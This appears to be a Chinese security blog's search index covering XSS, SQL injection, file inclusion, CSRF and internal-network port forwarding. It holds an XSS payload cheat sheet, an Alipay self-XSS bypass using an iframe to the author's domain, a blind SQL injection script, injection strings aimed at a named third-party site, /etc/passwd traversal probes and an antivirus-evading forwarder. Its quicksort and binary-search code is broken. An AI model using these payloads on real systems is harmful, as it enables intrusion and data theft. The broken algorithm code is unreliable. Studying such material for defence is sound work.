<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[蚂蚁森林self xss]]></title>
    <url>%2F2020%2F01%2F14%2F%E8%9A%82%E8%9A%81%E6%A3%AE%E6%9E%97self%20xss%2F</url>
    <content type="text"><![CDATA[记录一次支付宝的self xss 这两天闲的没(dan)事(teng)，刚好昨晚朋友圈刷了一波蚂蚁森林的self xss，那我也把之前的蚂蚁森林的self xss拿出来玩了一下，发现之前的&lt;script&gt;标签已经被过滤了。 既然&lt;script&gt;被过滤了，脑海中第二反应就是&lt;img&gt;了。 Code1&lt;img/src onerror=alert`哈哈`&gt; 好吧，还真容易，成功弹窗了~其实还有很多姿势可以成功弹窗，比如: Code123456&lt;svg/onload=alert`1`&gt;&lt;img/src onerror=alert`1`&gt;&lt;iframe/onload=alert`1`&gt;&lt;p/oncut=alert`1`&gt;&lt;TAG EVENT=alert`1`&gt;等等... 但是注意这里有字符限制，只允许输入30个字符。 然后昨晚8点多的时候支付宝就已经将改漏洞修复了。出现了熟悉的页面提示。。。 抱着侥幸的心理再尝试一下，一波操作后发现&lt;img&gt;，&lt;iframe&gt;还能用，只不过onerorr被过滤了，那我们就放弃&lt;img&gt;，尝试&lt;iframe&gt;标签。在自己服务器新建了一个页面，插到弹幕中去。x.html Code12345&lt;html&gt;&lt;script&gt;alert(`666`);&lt;/script&gt;&lt;/html&gt; 尝试第一个Payload Code1&lt;iframe src=&quot;http://fsunset.cn/x.html&quot;&gt; 好吧，支付宝间接的提示我太长了。。。 既然这样，让我直接将默认主页设置为x.html这个页面呗，就改一小会，反正我的网站也没人访问。 第二个Payload上场 Code1&lt;iframe src=&quot;http://fsunset.cn&quot;&gt; 嗯，好吧。还是太长了。。。心中一阵绞痛，为什么当初没买几个短一点的域名，当初如果把qq.com，jd.com买下来，今天还搞不定一个self xss??? 恢复理智之后。。。好吧，我TM把http去掉不就行了么。。。 Code1&lt;iframe src=&quot;//fsunset.cn&quot;&gt; 这里第一次尝试的时候没有弹窗。可能是上面的x.html写的有问题。。。好吧，有点牵强 然后我继续尝试第三种Payload Code1&lt;iframe src=&quot;http:fsunset.cn&quot;&gt; 不多不少当好30个字符 插进去试试呗，噢，，，一发入魂，成了 既然成了，杀个程序员祭天呗…改了自己服务器上的x.html页面后再次尝试 Code1&lt;iframe src=&quot;//fsunset.cn&quot;&gt; 发现是可以弹窗的 虽然这个漏洞没有什么技术含量，但是主要是尝试和绕过的限制一个过程。 尝试的过程中，顺便偷了一波能量，所以也导致某些人直接给我送礼]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>支付宝，XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS语句]]></title>
    <url>%2F2020%2F01%2F02%2FXSS%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[标准语句Code123&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 大小写Code1&lt;sCript&gt;alert(1)&lt;/scRipt&gt; 使用img标签windows事件Code123&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;//图片加载错误时触发 鼠标事件Code1234&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;//鼠标指针移动到元素时触发&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;//鼠标指针移出时触发 使用a标签Code12345&lt;a href=javascript:alert(&apos;xss&apos;)&gt;test&lt;/a&gt;&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=alert(&apos;xss&apos;)&gt;a&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&apos;xss&apos;) y=2020&gt;aa&lt;/a&gt; 使用input标签Code123456789101112&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;input value=&quot;&quot; onclick=alert(&apos;xss&apos;) type=&quot;text&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&apos;xss&apos;) bad=&quot;&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;//用户按下按键时触发&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;//用户按下按键时触发&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;//用户松开按键时触发 使用form标签Code12345678&lt;form action=javascript:alert(&apos;xss&apos;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&apos;xss&apos;)&gt;&lt;form method=post action=aa.asp? onmouseover=prompt(&apos;xss&apos;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&apos;xss&apos;)&gt;&lt;form action=1 onmouseover=alert(&apos;xss)&gt;&lt;!--原code--&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; 使用iframe标签Code123&lt;iframe src=javascript:alert(&apos;xss&apos;)&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&apos;xss&apos;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; &lt;!--原code--&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt; &lt;!--base64编码--&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; &lt;iframe src=&quot;aaa&quot; onmouseover=alert(&apos;xss&apos;) /&gt;&lt;iframe&gt; &lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt; 使用svg标签Code1&lt;svg onload=alert(1)&gt; 使用body标签Code12&lt;body onload=&quot;alert(1)&quot;&gt;//加载时触发 使用button标签Code12345678910111213141516&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;//元素上点击鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//元素上按下鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//在元素上释放鼠标时触发十一、 使用&lt;p&gt;标签&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//元素上按下鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//在元素上释放鼠标时触发 XSS编码绕过html实体编码(10进制与16进制)Code1如把尖括号编码[ &lt; ] -----&gt; html十进制: &amp;#60; html十六进制:&amp;#x3c; javascript的八进制与十六进制Code12345如把尖括号编码[ &lt; ] -----&gt; js八进制:\74 js十六进制:\x3c三个八进制数字，如果数字不够，在前面补零，如a的编码为\141两个十六进制数字，如果数字不够，在前面补零，如a的编码为\x61四个十六进制数字，如果数字不够，在前面补零，如a的编码为\u0061对于一些控制字符，使用特殊的C类型的转义风格，如\n和\r url编码Code1如把尖括号编码[ &lt; ] -----&gt; url: %22 base64编码Code1如把尖括号编码[ &lt; ] -----&gt; base64: Ig== jsunicode编码Code1如把尖括号编码[ &lt; ] -----&gt;jsunicode:\u003c String.fromCharCode编码Code1如alert的编码为String.fromCharCode(97,108,101,114,116)]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 年终总结]]></title>
    <url>%2F2020%2F01%2F01%2F2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[已不停机工作7千多天。回顾2019年。 初转眼大三毕业，实习结束。 2019，被荒废的一年。 学到知识、习得技能、增涨见识最多的一年。 初次步入社会，被人潮挤得灰头土脸。 在安全这条路上摸爬滚打。 明白了越来越多的0到1。 了解了不少的1到无穷。 溯新的一年，认清自己。勤学好问，脚踏实地。 不可 好高骛远 。—“病学者厌卑近而骛高远，卒无成焉。” 末我遇到了儿时的那个圆。 这次选择，也许只是为了完成儿时理想。 也许是想为人生的这一阶段画上一个圆。 本文纯属虚构，如有雷同，纯属意外~ 祝看到我的人和没看到我的人们：元旦快乐~新的一年身体健康，万事如意！]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>个人总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计]]></title>
    <url>%2F2019%2F12%2F26%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[代码审计简介顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。 工具源代码审计工具通常会查找常见漏洞，仅适用于特定的编程语言。 这种自动化工具可用于节省时间，但不应依赖于深入审计。 建议将这些工具作为基于政策的方法的一部分。 PHP代码审计RIPS下载地址：https://sourceforge.net/projects/rips-scanner Java代码审计findbugs下载地址：http://findbugs.sourceforge.net/downloads.htmlhttps://find-sec-bugs.github.io/ Pythonbandit下载地址：https://github.com/openstack/bandit py-find-injection下载地址：https://github.com/uber/py-find-injection pyt下载地址：https://github.com/python-security/pyt .netSecurity Code Scan下载地址：https://security-code-scan.github.io/ C++flawfinder下载地址：https://sourceforge.net/projects/flawfinder/ JSNodeJsScan下载地址：https://github.com/ajinabraham/NodeJsScan 商业工具静态RISP，VCG，Fortify SCA 动态360-sky wolf鸟哥-taintCobra-https://github.com/WhaleShark-Team/cobra]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker]]></title>
    <url>%2F2019%2F12%2F25%2Fdocker%2F</url>
    <content type="text"><![CDATA[docker常用命令Code123456789docker search [镜像名] //搜索镜像docker pull [镜像名] //下载镜像docker images //查看已下载的镜像docker ps -a //查看所有容器docker stop [容器名] //停止容器docker stop $(docker ps -aq) //停止容器docker rm [容器名] //删除容器docker rmi [镜像名] //删除镜像docker run [容器名] IMAGE //创建容器 run命令详解见:https://www.cnblogs.com/yfalcon/p/9044246.html docker搭建中的问题IPv4 forwarding is disabled. Networking will not workCode12345678910111213修改/etc/sysctl.conf或者/usr/lib/sysctl.d/00-system.conf添加如下代码：net.ipv4.ip_forward=1然后重启网络：systemctl restart network查看是否添加成功：sysctl net.ipv4.ip_forward输出为1时证明成功在宿主机上执行：net.ipv4.ip_forward=1 &gt;&gt; /usr/lib/sysctl.d/00-system.conf重启network和docker服务systemctl restart network &amp;&amp; systemctl restart docker 无法使用 systemctl 命令创建容器时加上：–privileged=true Code1234567Centos 7docker run -tid --name test_1 --privileged=true /usr/sbin/initdocker exec -it test_1 /bin/bashUbunut 16.04docker run -tid --name test_2 --privileged=true /sbin/initdocker exec -it test_2 /bin/bash]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客模板]]></title>
    <url>%2F2019%2F09%2F10%2FA%E6%A8%A1%E6%9D%BF%2F</url>
    <content type="text"><![CDATA[测试:hiof测试分类进度非结算单 一级标题二级标题Code1代码块]]></content>
      <categories>
        <category>分类</category>
      </categories>
      <tags>
        <tag>标签</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法(Python)]]></title>
    <url>%2F2019%2F09%2F10%2F%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[算法快速排序Code12345678def quicksort(arr): if len(arr)&lt;2: return arr else: j = arr[0] begin = [i for i in arr[1:] if i &lt;= j] end = [i for i in arr[1:] if i &gt; j] return quciksort(begin) + j + quicksort(end) 二分查找Code123456789101112def find(arr,itme): low = 0 high = len(arr) - 1 while(low &lt;= high): mid = int((end-begin)/2) guess = arr[mid] if guess == itme: return mid if guess &gt; itme: high = mid - 1 else: low = mid + 1 bool注入Code123456789101112131415161718192021222324252627282930313233343536import requestsdef len_db(len_payload): for i in range(1,20): if(len(requests.get(len_payload+str(i)+item).text)==108): print(len_payload + str(i) + item+&quot;[*]&quot;) return i else: print(len_payload+str(i)+item)def buer(l): s=&quot;&quot; for i in range(l): payload = &quot;http://localhost/sql/?id=1&apos; and ascii(substr(database(),&quot;+str(i+1)+&quot;,1))&quot; s += chr(binary(payload)) print(s) return sdef binary(payload): low = 32 high = 127 while(low&lt;=high): mid = int((low+high)/2) if(len(requests.get(payload+&quot;=&quot;+str(mid)+item).text)==108): print(payload + &quot;=&quot; + str(mid) + item + &quot;[*]&quot;) return mid if(len(requests.get(payload+&quot;&lt;&quot;+str(mid)+item).text)==108): print(payload + &quot;&lt;&quot; + str(mid) + item) high = mid - 1 else: print(payload + &quot;&gt;&quot; + str(mid) + item) low = mid + 1if __name__ == &apos;__main__&apos;: url = &quot;http://localhost/sql/?id=11&quot; item = &quot;--+&quot; len_payload = &quot;http://localhost/sql/?id=1&apos; and length(database())=&quot; l = len_db(len_payload) db = buer(l)]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OWASP TOP10]]></title>
    <url>%2F2019%2F09%2F09%2FOWASP-TOP10%2F</url>
    <content type="text"><![CDATA[注入注入漏洞,包括SQL,NoSQL,OS,LDAP注入等,这些攻击发生在当不可信的数据作为命令或查询语句的一部分,被发送给解释器的时候.攻击者发送的恶意数据可以欺骗解释器,以执行计划外额命令或未被恰当授权时访问数据. 失效的身份认证和会话管理与认证和会话管理相关的应用函数经常被错误的应用,这就允许攻击者窃取密码,密钥,会话token,或者利用其他的应用错误来暂时或者永久地获取用户身份信息 敏感信息泄露许多web应用和API不能合理的保护敏感数据,比如金融,医疗数据和PII.攻击者可能窃取或篡改这些弱保护的数据进行信用卡诈骗,身份窃取或者其他犯罪.敏感数据需要额外的保护,比如在存在和传输过程中的加密,在浏览器进行交换时也需要特殊的预防措施. 外部处理器漏洞(XXE)许多过时的或者配置不当的XML处理器在XML文档内进行外部实体引用.外部实体可以被用来泄露内部文件,比如使用文件URL handler,内部文件共享,内部端口扫描,远程代码执行和拒绝服务攻击. 无效的访问控制仅允许认证的用户的限制没有得到恰当的强制执行.攻击者可以利用这些权限来访问未经授权的功能和数据,例如访问其他用户的账户,参看敏感文件,修改其他用户的数据,更改访问权限等. 错误的安全配置安全配置错误时常见的问题,这是不安全的默认配置,不完整或者ad hoc望楼配置,开放云储存,错误配置的HTTP头,含有敏感信息的冗长错误信息造成的.除了要安全设定所有的操作系统,框架,库,应用外,还要及时进行系统更新和升级. 跨站脚本攻击当应用程序在新网页中包含不受信任的数据而无需正确的验证或转义时,或使用可以创建HTML或者JavaScript的浏览器API并使用用户提供的数据更新现有网页就会发生XSS缺陷.XSS允许攻击者在受害者的浏览器上执行脚本,从而劫持用户会话,危害网站,或者将用户转向恶意网站. 不安全的反序列化不安全的反序列化漏洞经常导致远程代码执行.即使反序列化错误不导致远程代码执行,也可以被用于发起攻击,例如重放攻击,注入攻击和权限提升攻击等 使用含有已知的漏洞的组件组件,比如库,框架和其他软件模块,是与应用相同权限运行的.如果一个有漏洞的组件被利用,这种攻击可以造成更为严重的数据丢失或服务器接管.使用已知漏洞组件的应用和API可能会破坏应用程序的防御系统,并使一系列可能的攻击和影响成为可能. 不完善的日志记录和监控记录和监控不足,加上没有与应急响应有效的结合,让攻击者可以进一步攻击系统,篡改,提权或者销毁数据.大多数的数据泄露研究显示,通常要经过200天以上,使用者才能察觉到数据泄露时间的发生,而且往往是外部机构而不是内部监控系统发现数据泄露的事实.]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>OWASP-TOP10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF漏洞]]></title>
    <url>%2F2019%2F09%2F08%2FCSRF%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[CSRF漏洞的概述 CSRF(Cross-Site Request Forgery,跨站请求伪造) 是一种挟制用户在当前已登录的Web应用程序上执行非 本意的操作的攻击方法, 攻击者盗用了你在某个网站的身份，以你的名义发送恶意请求。 CSRF漏洞的原理 被攻击的两个前提: 1.登陆信任网站A, 并在本地生成Cookie 2.在不退出的情况下, 访问危险网站B 如不满足上述任意条件,就不会受到CSRF攻击让用户执行非本意的操作挟持用户某些html标签是可以发送HTTP GET类型的请求的。例如 &lt;img src=”http://www.baidu.com&quot;&gt;浏览器渲染img标签的时候, 并不知道img标签中的src属性值到底是不是一个图片. 浏览器只是根据src中的链接, 发起一个HTTP GET请求, 并携带上当前浏览器在目标网站上的凭证, 也就是cookie, 获取返回结果以图片的形式渲染. CSRF漏洞的分类与利用 GET CSRF CSRF最初的一个错误观点, 认为只能有GET请求发起, 因此一些开发者认为只要把重哎哟的操作改为POST请求就可以防止CSRF PHP中 $_REQUEST 既可以接收POST也可以接收GET请求 POST CSRF 如果服务端已经分了GET和POST请求, 只用$_POST来接收请求数据: 就最简单的方法就是在攻击页面构造一个form表单, 然后用javascript自动提交这个表单 CSRF漏洞的挖掘与防御 使用token 验证码 验证referer]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python端口转发]]></title>
    <url>%2F2019%2F09%2F01%2FPython%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[Python实现lcx免杀!基于命令的lcx存在无法绕过杀毒软件的拦截,并且需要管理员权限等问题 定义ForwarderCode1234567891011121314class PortForwarder(asyncore.dispatcher):#监听本地 def __init__(self, ip, port, remoteip, remoteport, backlog=5): asyncore.dispatcher.__init__(self) self.remoteip = remoteip self.remoteport = remoteport self.create_socket(socket.AF_INET, socket.SOCK_STREAM)#创建一个套接字对象 self.set_reuse_addr()#设置地址端口可重用 self.bind((ip, port))#绑定本地ip与端口 self.listen(backlog)#开始监听 def handle_accept(self):#处理接受 conn, addr = self.accept()#等待接受 print &quot;Connected to:&quot;, addr Sender(Receiver(conn), self.remoteip, self.remoteport) 调用Forwarder,并且执行asyncore.loopCode12PortForwarder(local_host, local_port, remote_host, remote_port)asyncore.loop() 接收本地的请求，发给远程主机Code1234567891011121314151617181920212223242526272829class Receiver(asyncore.dispatcher):#接受本地请求数据，发送给远程主机 def __init__(self, conn): asyncore.dispatcher.__init__(self, conn) #self被初始化为该连接客户端socket #getpeername函数用于获取与某个套接字关联的外地协议地址 self.from_remote_buffer = &apos;&apos;#保存来自远程主机数据 self.to_remote_buffer = &apos;&apos; #保存本地请求数据 self.sender = None def handle_connect(self): pass def handle_read(self):#接受本地请求 read = self.recv(BUFSIZE) self.to_remote_buffer += read; print &quot;receiver read&quot;, self.to_remote_buffer def writable(self):#判断是否有来自远程主机的数据，如果有，调用handle_write return (len(self.from_remote_buffer) &gt; 0) def handle_write(self):#发送来自远程主机的数据给本地主机 sent = self.send(self.from_remote_buffer) print &quot;receiver sent&quot;, sent self.from_remote_buffer = self.from_remote_buffer[sent:]#发送完成后清空数据 def handle_close(self): self.close() if self.sender: self.sender.close() 接受远程主机数据，发给本地请求Code12345678910111213141516171819202122232425262728293031class Sender(asyncore.dispatcher):#接受远程主机数据，发送本地请求数据 def __init__(self, receiver, remoteaddr, remoteport): asyncore.dispatcher.__init__(self) self.receiver = receiver#建立Sender与Receiver之间联系 receiver.sender = self #建立Sender与Receiver之间联系 self.create_socket(socket.AF_INET, socket.SOCK_STREAM)#创建套接字 self.connect((remoteaddr, remoteport))#连接远程主机 def handle_connect(self): pass def handle_read(self):#接受来自远程主机的数据 read = self.recv(BUFSIZE) self.receiver.from_remote_buffer += read print &quot;sender read&quot;, self.receiver.from_remote_buffer def writable(self):#判断是否有本地请求要发送，如果有，调用handle_write if len(self.receiver.to_remote_buffer) &gt; 0: self.receiver.to_remote_buffer = self.receiver.to_remote_buffer.replace\ (LOCAL_SERVER_HOST + &apos;:&apos; + str(LOCAL_SERVER_PORT), REMOTE_SERVER_HOST) #修改本地请求数据，将本地主机中host改为远程主机地址 return (len(self.receiver.to_remote_buffer) &gt; 0) def handle_write(self):#发送本地请求数据 sent = self.send(self.receiver.to_remote_buffer) print &quot;sender write&quot;,sent self.receiver.to_remote_buffer = self.receiver.to_remote_buffer[sent:] def handle_close(self): self.close() self.receiver.close()]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码Code12345if(isset($_GET[&apos;page&apos;]))&#123; include $_GET[&apos;page&apos;];&#125;else&#123; include &quot;one.php&quot;;&#125; 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件查看与下载]]></title>
    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E4%B8%8E%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[背景 一些网站的业务需求，可能提供文件查看或下载的功能，如果对用户 查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源 代码文件、敏感文件等等。 成因 不管是任意文件读取还是任意文件下载，触发的漏洞条件都是相同的 存在读取文件的函数 读取文件的路径用户可控且未校验或校验不严 输出了文件内容 漏洞危害 下载服务器任意文件，包含脚本代码文件 、系统敏感文件等。可以 配合其它类型的漏洞。可以进一步代码审计，查找更多可利用的代码。 漏洞分类 任意文件读取 Code12345678910111213&lt;?php $filename=&quot;test.txt&quot;;readfile($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;;echo file_get_contens($filename);?&gt;&lt;?php $filename=&quot;test.txt&quot;; $fp=fopen($filename,&quot;r&quot;)or die(&quot;Unable to open file!&quot;); $data=fread($fp,1024); fclose($fp); echo $data;?&gt; $filename=$_GET[f]; $filename没有经过校验,或者校验不合格,用户可以控制这个变量读取任意文件,比如/etc/passwd,index.php等等. 任意文件下载 Code123456789101112131415&lt;?php if(empty($_GET[&apos;filename&apos;]))&#123; exit(); &#125; $filename=$_GET[&apos;filename&apos;]; *eader(&quot;Content-Type:application/octet-stream&quot;); header(&quot;Accept-Length:&quot;.filesize($filename)); header(&quot; Content-Disposition:attachment;filename=&quot;.$filename ); readfile($filename);?&gt; 在上述代码中: $filename=&quot;uploads/20170206.jpg&quot;; $filename一般是用户需要下载的文件 $filename$_GET[f]; $filename没有经验校验,或者校验不合格,用户可以控制这个变量下载任意文件,比如/etc/passwd 漏洞挖掘 Web漏洞扫描器(AWVS,AppScan,Openvas,Nessus) 手动从链接 readfile.php?file=xxx.txt download.php?file=xxx.rar 参数名查看 &amp;readpath,&amp;filepath,&amp;path,&amp;inputfile,&amp;url,&amp;data,&amp;readfile,&amp;menu,META-INF,WEB-INF 漏洞验证 index.php?f=../../../../../etc/passwd index.php?f=../index.php index.php?f=file:///etc/passwd 当参数f值为php文件时: 若文件被解析则是文件包含漏洞 若显示源码,则是文件查看漏洞 提示下载则是文件下载漏洞 漏洞修复方案 过滤 . 点,使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限制文件访问范围]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>文件查看</tag>
        <tag>文件下载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Network-Shell端口转发]]></title>
    <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
    <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
        <tag>内网渗透</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lcx端口转发]]></title>
    <url>%2F2019%2F08%2F18%2Flcx%2F</url>
    <content type="text"><![CDATA[lcx使用方法Windows参数 -tran [等待连接的端口] [目标IP] [目标端口] -listen [连接端口] [传输端口] -slave [远程服务器IP] [服务器连接端口] [内网IP] [内网主机端口] Linux参数 Usage:./linuxlcx -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 -v: version -h1: host1 -h2: host2 -p1: port1 -p2: port2 -log: log the data -m: the action method for this tool -m 1: listen on PORT1 and connect to HOST2:PORT2 -m 2: listen on PORT1 and PORT2 -m 3: connect to HOST1:PORT1 and HOST2:PORT2 差异 -m 1 对应 -tran -m 2 对应 -listen -m 3 对应 -slave -tran实例 2.2.2.2 -&gt; lcx -tran 5000 3.3.3.3 3389 1.1.1.1 -&gt; mstsc 2.2.2.2 5000 -listen -slave实例 49.235.204.16 -&gt; ./linuxlcx -m 2 -p1 6666 -p2 7777 监听6666端口,将数据转发到7777上 192.168.10.10 -&gt; lcx.exe -slave 49.235.204.16 6666 192.168.10.10 3389 172.16.10.100 -&gt; mstsc 49.235.204.16:7777 -&gt; 192.168.10.10:3389 工具链接 链接：https://pan.baidu.com/s/1bcran7Xo3kYGKiXZ8HY6hQ 提取码：8unf]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
        <tag>内网渗透</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入]]></title>
    <url>%2F2019%2F08%2F16%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[SQL注入 and 1=1 / and 1=2 回显页面不同（整形判断） 单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断） \ (转义符) -1/+1 回显下一个或上一个页面（整型判断） and sleep(5) UNION query SQL injection（可联合查询注入） 前提:页面上有显示位,缺点亦是页面上必须有显示位 优点:方便,快捷,易于利用 判断列数 : order by 4 (数值取到最大,页面显示正常,下一步判断显示位) 判断显示位 : php?id=-1 union select 1,2,3,4 //id=-1 让第一行无法正常显示,显示出显示位 http://www.asfaa.org/members.php?id=-3 union select 1,database(),3,group_concat(table_name) from information_schema.tables where table_schema=database() //爆出当前库所有表名 Error-based SQL injection（报错型注入） 页面上没有显示位,但是需要输出SQL语句执行错误信息( 比如:mysqli_error() ) 优点不需要显示位 通过floor报错 floor 通过 and extractvalue(1,payload) 报错 http://127.0.0.1/st/day02/baji/vul/user/show_error.php?id=1 and extractvalue(1,concat(0x27,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) //爆出所有表名 通过 and updatexml(1,payload,1)报错 与extractvalue(1,payload)相同 Boolean-based blind SQL injection（布尔型注入） 